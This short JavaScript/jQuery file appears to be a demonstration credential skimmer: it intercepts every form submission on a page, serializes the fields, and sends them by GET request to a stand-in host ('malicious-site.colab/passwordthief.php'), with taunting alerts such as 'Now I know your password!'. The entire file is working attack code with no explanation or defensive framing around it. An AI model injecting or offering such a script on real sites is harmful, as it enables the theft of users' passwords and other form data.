alert('Gotcha!');

jQuery(document).ready(function($){
	$('form').submit(function(e) {
		e.preventDefault();
		var formInfo = $(this).serialize();
		$.get('http://malicious-site.colab/passwordthief.php?' + formInfo);
		console.log($(this).serialize);
		alert('Now I know your password!');
	});

});
